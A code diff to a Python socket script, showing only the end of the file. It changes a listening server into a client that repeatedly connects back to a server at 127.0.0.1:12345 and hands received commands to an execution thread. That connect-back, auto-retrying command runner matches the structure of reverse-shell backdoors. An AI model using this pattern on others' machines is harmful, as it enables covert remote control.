@@ -172,22 +172,35 @@ def check_for_commands(conn):
         shutdown_event.set()
         print("Connection closed")
 
-with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
-    server_socket.bind(('', 12345))
-    server_socket.listen(1)
+# Server info
+server_ip = '127.0.0.1'
+server_port = 12345
 
-    print("Waiting for connection...")
-    client_socket, addr = server_socket.accept()
-    print("Connected to {}".format(addr))
-    
-    producer = threading.Thread(target=check_for_commands, args=(client_socket,), daemon=True)
-    consumer = threading.Thread(target=execute_command, daemon=True)
+while not shutdown_event.is_set():
+    try:
+        print(f"Attempting to connect to {server_ip}:{server_port}...")
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
+            client_socket.connect((server_ip, server_port))
+            print("Connected to server.")
 
-    
-    consumer.start()
-    producer.start()
-    
-    while(not shutdown_event.is_set()):
-        time.sleep(0.1)
+            shutdown_event.clear()
+
+            producer = threading.Thread(target=check_for_commands, args=(client_socket,), daemon=True)
+            consumer = threading.Thread(target=execute_command, daemon=True)
+
+            producer.start()
+            consumer.start()
+
+            while not shutdown_event.is_set():
+                time.sleep(0.1)
+
+    except (ConnectionRefusedError, OSError):
+        print("Connection failed. Retrying in 5 seconds...")
+        stop()
+        time.sleep(5)
+
+    print("Disconnected. Reconnecting...")
+    shutdown_event.clear()
+    time.sleep(1)
     
 stop()
